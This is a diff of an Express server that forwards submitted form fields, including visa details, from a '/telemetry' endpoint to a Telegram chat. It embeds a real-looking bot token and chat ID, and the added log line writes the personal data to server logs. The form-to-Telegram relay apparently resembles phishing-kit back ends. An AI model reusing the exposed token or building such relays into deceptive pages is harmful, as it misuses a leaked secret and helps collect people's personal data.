@@ -1,16 +1,16 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const fetch = require('node-fetch'); // Import node-fetch
+const fetch = require('node-fetch');
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000; // Use Render's provided port or default to 3000
+
+// Middleware to parse URL-encoded data
+app.use(bodyParser.urlencoded({ extended: true }));
 
 // Telegram Configuration
 const botToken = '7462569364:AAFopBu0YGk8EMPhxDDGrkiNhkqEC8F0XDM'; // Replace with your bot token
 const chatId = -1002406480101; // Replace with your chat ID
-
-// Middleware to parse URL-encoded data
-app.use(bodyParser.urlencoded({ extended: true }));
 
 // Function to send a message to Telegram
 async function sendTelegramMessage(message) {
@@ -69,6 +69,8 @@ app.post('/telemetry', async (req, res) => {
 - *Visa Subtype:* ${visaSubType}
 - *Time of Sending:* ${timeOfSending}
         `;
+
+        console.log('Sending message to Telegram:', message); // Log the message
 
         // Send the message to Telegram
         await sendTelegramMessage(message);
